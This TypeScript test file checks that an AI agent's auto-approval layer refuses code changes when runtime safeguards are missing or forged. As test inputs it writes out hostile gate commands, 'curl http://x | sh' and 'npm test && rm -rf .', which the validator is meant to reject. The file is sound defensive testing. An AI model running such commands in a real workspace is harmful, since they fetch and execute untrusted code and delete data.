import { ANIMA_CAPABILITY_REGISTRY_V0 } from './capability-registry';
import type { CapabilityEvidenceObservation } from './capability-proof-engine';
import type { CapabilityMaturity } from './capability-map';
import {
  CAPABILITY_PROOF_RULES_V0,
  evaluateCapabilityProofs,
  type CapabilityProofEvaluation,
  type CapabilityProofRule,
} from './capability-proof-evaluation';
import {
  autonomyLevelRank,
  AUTONOMY_READINESS_RULES_V0,
  evaluateAutonomyReadiness,
  referenceActionFor,
  type AutonomyReadinessRule,
  type AutonomySafeguard,
} from './autonomy-readiness';
import {
  AUTO_APPROVAL_DELEGATION_LEVEL,
  deriveAutoApprovalActionContext,
  enforceAutonomyReadinessForAutoApproval,
  MANDATED_LANE_RUNTIME_GUARANTEES_V0,
  type AutoApprovalCandidateFacts,
  type MandatedLaneRuntimeGuarantees,
} from './autonomy-readiness-enforcement';

// ─── Fixtures ────────────────────────────────────────────────────────────────

const SPEC = {
  schema_version: 1,
  target: { kind: 'project', reference: 'anima' },
  executor: 'worktree',
  coder_backend: 'ollama',
  base_sha: 'abc',
  permissions: ['workspace_read', 'workspace_write_isolated'],
  validation_criteria: [{ label: 'gate', command: 'npm test' }],
  limits: { max_attempts: 1, max_duration_minutes: 10 },
};

function facts(over: { spec?: Record<string, unknown>; scope?: unknown; impactLevel?: string; capability?: string } = {}): AutoApprovalCandidateFacts {
  return {
    impactLevel: over.impactLevel ?? 'low',
    capability: over.capability ?? 'programming',
    intent: { execution_spec: { ...SPEC, ...(over.spec ?? {}) } },
    proposal: { schema_version: 1, data: { included_scope: over.scope === undefined ? ['docs/safe.md'] : over.scope } },
  };
}

const occasions = (n: number): CapabilityEvidenceObservation[] =>
  Array.from({ length: n }, (_, i) => ({
    id: `pc-${i}`,
    capabilityId: 'agency.produce-change',
    evidenceClass: 'verified_execution',
    outcome: 'positive',
    observedAt: `2026-09-2${i}T10:00:00Z`,
    occasionId: `attempt-${i}`,
    proofRefs: [{ kind: 'attempt', ref: `attempt-${i}` }],
  }));

/** Estado real: registry + regras canônicas ⇒ produce-change proven. */
const CURRENT = (): readonly CapabilityProofEvaluation[] => evaluateCapabilityProofs({ evidence: occasions(8) });

/** Sintético: produce-change operacional sob regra sintética. NÃO toca o registry real. */
const SYNTHETIC_PROOF_RULES: readonly CapabilityProofRule[] = CAPABILITY_PROOF_RULES_V0.map((rule) =>
  rule.capabilityId === 'agency.produce-change'
    ? { ...rule, derivationCeiling: 'operational', reproductionSatisfiesOperational: true }
    : rule,
);
function synthetic(declared: CapabilityMaturity = 'operational', evidence = occasions(3)): readonly CapabilityProofEvaluation[] {
  return evaluateCapabilityProofs({
    capabilities: ANIMA_CAPABILITY_REGISTRY_V0.map((capability) =>
      capability.id === 'agency.produce-change' ? { ...capability, maturity: declared } : capability,
    ),
    rules: SYNTHETIC_PROOF_RULES,
    evidence,
  });
}

/** Perfil HIPOTÉTICO: Verifier obrigatório e fail-closed (não existe hoje). */
const HYPOTHETICAL_FAIL_CLOSED_VERIFIER: MandatedLaneRuntimeGuarantees = {
  ...MANDATED_LANE_RUNTIME_GUARANTEES_V0,
  version: 'hypothetical-fail-closed-verifier',
  verifier: 'required_fail_closed',
};

const readinessUnder = (f: AutoApprovalCandidateFacts, guarantees: MandatedLaneRuntimeGuarantees, evaluations = synthetic()) => {
  const derived = deriveAutoApprovalActionContext(f, guarantees);
  if (!derived.ok) throw new Error(derived.missing);
  return evaluateAutonomyReadiness({
    capabilityId: 'agency.produce-change',
    actionContext: derived.context,
    proofEvaluations: evaluations,
    proofRules: SYNTHETIC_PROOF_RULES,
  });
};

const safeguardsOf = (f: AutoApprovalCandidateFacts, guarantees = MANDATED_LANE_RUNTIME_GUARANTEES_V0): readonly AutonomySafeguard[] => {
  const derived = deriveAutoApprovalActionContext(f, guarantees);
  if (!derived.ok) throw new Error(derived.missing);
  return derived.context.safeguards;
};

const enforce = (f: AutoApprovalCandidateFacts, proofEvaluations: readonly CapabilityProofEvaluation[] | null, proofRules?: readonly CapabilityProofRule[], rules?: readonly AutonomyReadinessRule[]) =>
  enforceAutonomyReadinessForAutoApproval({ facts: f, proofEvaluations, proofRules, rules });

// ─── Tabela de verdade (Mandated Envelope Hardening V0) ──────────────────────

describe('Mandated Envelope Hardening V0 — salvaguarda declarada = salvaguarda aplicada', () => {
  it('1. só aparece presente o que o caminho real garante', () => {
    const present = safeguardsOf(facts());
    expect([...present].sort()).toEqual(
      [
        'allowed_paths',
        'budget_cap',
        'checkpoint',
        'command_allowlist',
        'gates',
        'human_acceptance',
        'isolated_worktree',
        'max_attempts',
        'no_auto_integration',
        'no_network',
        'no_paid_compute',
        'recovery_path',
        'timeout',
      ].sort(),
    );
    // Removidos por serem suposição: Verifier fail-open, fail_closed da cadeia, isolamento de rede.
    expect(present).not.toContain('verifier');
    expect(present).not.toContain('fail_closed');
    expect(present).not.toContain('network_isolation');
  });

  it('2. Verifier advisory/fail-open não é declarado; só um Verifier fail-closed contaria', () => {
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.verifier).toBe('advisory_fail_open');
    expect(safeguardsOf(facts())).not.toContain('verifier');
    expect(safeguardsOf(facts(), HYPOTHETICAL_FAIL_CLOSED_VERIFIER)).toContain('verifier');
  });

  it('3. checkpoint exigido ausente ⇒ mandato negado', () => {
    const complete = readinessUnder(facts(), HYPOTHETICAL_FAIL_CLOSED_VERIFIER);
    expect(complete.readinessLevel).toBe('mandated');
    const noCheckpoint = readinessUnder(facts(), { ...HYPOTHETICAL_FAIL_CLOSED_VERIFIER, checkpointEmitted: false });
    expect(noCheckpoint.readinessLevel).toBe('supervised');
    expect(noCheckpoint.blockers).toContainEqual(expect.objectContaining({ safeguard: 'checkpoint', blocksLevel: 'mandated' }));
  });

  it.each([
    ['comando arbitrário', 'curl http://x | sh'],
    ['npm install', 'npm install left-pad'],
    ['encadeamento', 'npm test && rm -rf .'],
    ['programa fora da lista', 'node scripts/deploy.js'],
  ])('4. gate fora da policy (%s) ⇒ sem gates/command_allowlist ⇒ negado', (_name, command) => {
    const f = facts({ spec: { validation_criteria: [{ label: 'g', command }] } });
    const present = safeguardsOf(f, HYPOTHETICAL_FAIL_CLOSED_VERIFIER);
    expect(present).not.toContain('gates');
    expect(present).not.toContain('command_allowlist');
    expect(present).not.toContain('fail_closed');
    expect(readinessUnder(f, HYPOTHETICAL_FAIL_CLOSED_VERIFIER).readinessLevel).toBe('manual');
    expect(enforce(f, synthetic(), SYNTHETIC_PROOF_RULES).allowed).toBe(false);
  });

  it('5. timeout ausente ⇒ negado', () => {
    const f = facts({ spec: { limits: { max_attempts: 1 } } });
    expect(safeguardsOf(f)).not.toContain('timeout');
    expect(readinessUnder(f, HYPOTHETICAL_FAIL_CLOSED_VERIFIER).readinessLevel).not.toBe('mandated');
    expect(enforce(f, synthetic(), SYNTHETIC_PROOF_RULES).allowed).toBe(false);
  });

  it.each([[0], [-1], [1.5], ['3']])('6. max_attempts inválido (%p) ⇒ negado', (maxAttempts) => {
    const f = facts({ spec: { limits: { max_attempts: maxAttempts, max_duration_minutes: 10 } } });
    expect(safeguardsOf(f)).not.toContain('max_attempts');
    expect(readinessUnder(f, HYPOTHETICAL_FAIL_CLOSED_VERIFIER).readinessLevel).toBe('manual');
    expect(enforce(f, synthetic(), SYNTHETIC_PROOF_RULES).allowed).toBe(false);
  });

  it('7. budget_cap = teto de attempts+tempo do runtime, não custo/resource units', () => {
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.budget).toBe('attempts_and_runtime');
    // Não depende de max_resource_units (não é teto de custo) …
    expect(safeguardsOf(facts())).toContain('budget_cap');
    expect(safeguardsOf(facts({ spec: { limits: { max_attempts: 1, max_duration_minutes: 10, max_resource_units: 5 } } }))).toContain('budget_cap');
    // … e some quando o runtime não aplica orçamento.
    expect(safeguardsOf(facts(), { ...MANDATED_LANE_RUNTIME_GUARANTEES_V0, budget: 'none' })).not.toContain('budget_cap');
  });

  it('8. permissão de rede negada ≠ isolamento de rede provado', () => {
    const present = safeguardsOf(facts());
    expect(present).toContain('no_network');
    expect(present).not.toContain('network_isolation');
    expect(safeguardsOf(facts(), { ...MANDATED_LANE_RUNTIME_GUARANTEES_V0, network: 'isolation_proven' })).toContain('network_isolation');

    // Blockers distintos na readiness.
    const runTests = referenceActionFor('agency.run-tests');
    const evaluations = evaluateCapabilityProofs({
      evidence: [0, 1, 2].map((i) => ({ ...occasions(3)[i]!, id: `rt-${i}`, capabilityId: 'agency.run-tests' })),
    });
    const withoutPermission = evaluateAutonomyReadiness({
      capabilityId: 'agency.run-tests',
      actionContext: { ...runTests, safeguards: runTests.safeguards.filter((s) => s !== 'no_network') },
      proofEvaluations: evaluations,
    });
    // Sem a permissão negada, o MANDATO cai por `network_permission_not_denied` —
    // não por falta de isolamento (que só bloqueia `autonomous`).
    expect(withoutPermission.readinessLevel).toBe('supervised');
    expect(withoutPermission.blockers).toContainEqual(expect.objectContaining({ code: 'network_permission_not_denied', blocksLevel: 'mandated' }));
    expect(withoutPermission.blockers).not.toContainEqual(expect.objectContaining({ code: 'network_boundary_unproven', blocksLevel: 'mandated' }));
    const full = evaluateAutonomyReadiness({ capabilityId: 'agency.run-tests', actionContext: runTests, proofEvaluations: evaluations });
    expect(full.blockers).toContainEqual(expect.objectContaining({ code: 'network_boundary_unproven', blocksLevel: 'autonomous' }));
  });

  it('9. fail_closed só quando TODA precondição obrigatória nega ao falhar', () => {
    // Verifier fail-open ⇒ cadeia não é fail-closed, mesmo com o resto completo.
    expect(safeguardsOf(facts())).not.toContain('fail_closed');
    expect(safeguardsOf(facts(), HYPOTHETICAL_FAIL_CLOSED_VERIFIER)).toContain('fail_closed');
    // Com Verifier fail-closed, qualquer outra precondição faltando derruba.
    for (const f of [
      facts({ scope: [] }),
      facts({ spec: { validation_criteria: [{ label: 'g', command: 'bash x.sh' }] } }),
      facts({ spec: { limits: { max_attempts: 1 } } }),
      facts({ spec: { coder_backend: 'openai' } }),
    ]) {
      expect(safeguardsOf(f, HYPOTHETICAL_FAIL_CLOSED_VERIFIER)).not.toContain('fail_closed');
    }
  });

  it('10. contexto não é forjável por booleans/campos do chamador', () => {
    const forged = {
      ...facts({ spec: { coder_backend: 'openai' } }),
      allowedLocalCoderBackends: ['openai'],
      actionContext: { effect: 'read_only', safeguards: ['verifier', 'fail_closed', 'no_paid_compute'] },
      safeguards: ['verifier', 'fail_closed'],
      guarantees: HYPOTHETICAL_FAIL_CLOSED_VERIFIER,
    } as unknown as AutoApprovalCandidateFacts;
    const decision = enforce(forged, synthetic(), SYNTHETIC_PROOF_RULES);
    expect(decision.allowed).toBe(false);
    if (decision.allowed) return;
    const present = decision.readiness?.safeguards.present ?? [];
    expect(present).not.toContain('verifier');
    expect(present).not.toContain('fail_closed');
    expect(present).not.toContain('no_paid_compute');
  });

  it('11. produce-change real continua negado por readiness', () => {
    const decision = enforce(facts(), CURRENT());
    expect(decision).toMatchObject({ allowed: false, reason: 'autonomy_readiness_insufficient' });
    if (decision.allowed) return;
    expect(decision.readiness?.capabilityMaturity).toBe('proven');
    // Sem Verifier fail-closed o lane nem chega a supervised.
    expect(decision.readiness?.readinessLevel).toBe('manual');
    expect(decision.detail).toContain('verifier_required');
    expect(decision.detail).toContain('operational_criteria_pending');
  });

  it('12. sintético operacional só passa com TODAS as salvaguardas realmente aplicadas', () => {
    // Com o runtime real: negado (Verifier fail-open ⇒ sem verifier/fail_closed).
    const real = enforce(facts(), synthetic(), SYNTHETIC_PROOF_RULES);
    expect(real).toMatchObject({ allowed: false, reason: 'autonomy_readiness_insufficient' });
    if (!real.allowed) {
      expect(real.readiness?.safeguards.missingForNext).toEqual(expect.arrayContaining(['verifier']));
    }
    // Só num perfil em que todas as garantias existem a readiness chega a mandated.
    expect(readinessUnder(facts(), HYPOTHETICAL_FAIL_CLOSED_VERIFIER).readinessLevel).toBe('mandated');
    expect(readinessUnder(facts(), MANDATED_LANE_RUNTIME_GUARANTEES_V0).readinessLevel).toBe('manual');
  });
});

// ─── Enforcement (fail-closed) — mantidos do V0 ──────────────────────────────

describe('Autonomy Readiness Enforcement V0 — authority não excede readiness', () => {
  it('histórico indisponível ⇒ negado', () => {
    expect(enforce(facts(), null)).toMatchObject({ allowed: false, reason: 'autonomy_readiness_history_unavailable' });
  });

  it('avaliação ausente ou inconsistente ⇒ negado', () => {
    expect(enforce(facts(), [])).toMatchObject({ allowed: false, reason: 'autonomy_readiness_evaluation_invalid' });
    expect(enforce(facts(), synthetic())).toMatchObject({ allowed: false, reason: 'autonomy_readiness_evaluation_invalid' });
  });

  it('capacidade divergente (declarado × derivado) ⇒ negado', () => {
    expect(enforce(facts(), synthetic('proven'), SYNTHETIC_PROOF_RULES)).toMatchObject({
      allowed: false,
      reason: 'autonomy_readiness_evaluation_invalid',
    });
  });

  it('readiness manual (sem evidência) ⇒ negado', () => {
    expect(enforce(facts(), evaluateCapabilityProofs({ evidence: [] })).allowed).toBe(false);
  });

  it.each([
    ['sem execution_spec', { ...facts(), intent: {} }, 'execution_spec'],
    ['executor não-worktree', facts({ spec: { executor: 'commanded' } }), 'executor_worktree'],
    ['permissões além da worktree', facts({ spec: { permissions: ['workspace_read', 'network'] } }), 'permissions_isolated'],
    ['sem limits', facts({ spec: { limits: null } }), 'limits'],
    ['impacto desconhecido', facts({ impactLevel: 'weird' }), 'impact_level'],
  ])('contexto incompleto ⇒ negado (%s)', (_name, f, missing) => {
    const decision = enforce(f, synthetic(), SYNTHETIC_PROOF_RULES);
    expect(decision).toMatchObject({ allowed: false, reason: 'autonomy_readiness_context_incomplete' });
    if (!decision.allowed) expect(decision.detail).toContain(missing);
  });

  it('capacidade de trabalho sem mapeamento ⇒ negado', () => {
    expect(enforce(facts({ capability: 'writing' }), synthetic(), SYNTHETIC_PROOF_RULES)).toMatchObject({
      allowed: false,
      reason: 'autonomy_readiness_capability_unmapped',
    });
  });

  it('REGRESSÃO — INVARIANTE: nenhuma auto-aprovação concede nível acima da readiness', () => {
    const maturities: CapabilityMaturity[] = ['implemented', 'proven', 'operational', 'degraded'];
    const factVariants: AutoApprovalCandidateFacts[] = [
      facts(),
      facts({ scope: [] }),
      facts({ spec: { validation_criteria: [{ label: 'g', command: 'bash x.sh' }] } }),
      facts({ spec: { limits: { max_attempts: 1 } } }),
      facts({ spec: { coder_backend: 'openai' } }),
      facts({ impactLevel: 'external' }),
    ];
    const evidenceVariants = [occasions(0), occasions(1), occasions(3)];
    let allowedCount = 0;
    for (const declared of maturities) {
      for (const evidence of evidenceVariants) {
        for (const proofRules of [CAPABILITY_PROOF_RULES_V0, SYNTHETIC_PROOF_RULES]) {
          const evaluations = evaluateCapabilityProofs({
            capabilities: ANIMA_CAPABILITY_REGISTRY_V0.map((capability) =>
              capability.id === 'agency.produce-change' ? { ...capability, maturity: declared } : capability,
            ),
            rules: proofRules,
            evidence,
          });
          for (const f of factVariants) {
            const decision = enforce(f, evaluations, proofRules);
            if (!decision.allowed) continue;
            allowedCount += 1;
            expect(autonomyLevelRank(decision.readiness.readinessLevel)).toBeGreaterThanOrEqual(autonomyLevelRank(AUTO_APPROVAL_DELEGATION_LEVEL));
            expect(autonomyLevelRank(decision.audit.observed_level)).toBeGreaterThanOrEqual(autonomyLevelRank(decision.audit.required_level));
          }
        }
      }
    }
    // Com as regras canônicas e o runtime real, NENHUMA combinação libera.
    expect(allowedCount).toBe(0);
  });

  it('não altera as regras canônicas nem promove produce-change', () => {
    expect(CAPABILITY_PROOF_RULES_V0.find((rule) => rule.capabilityId === 'agency.produce-change')).toMatchObject({
      derivationCeiling: 'proven',
      reproductionSatisfiesOperational: false,
    });
    expect(ANIMA_CAPABILITY_REGISTRY_V0.find((capability) => capability.id === 'agency.produce-change')?.maturity).toBe('proven');
    const rule = AUTONOMY_READINESS_RULES_V0.find((entry) => entry.capabilityId === 'agency.produce-change')!;
    expect(rule.requiredSafeguards.supervised).toContain('verifier');
    expect(rule.requiredSafeguards.mandated).toEqual(expect.arrayContaining(['checkpoint', 'budget_cap', 'fail_closed', 'timeout']));
  });
});
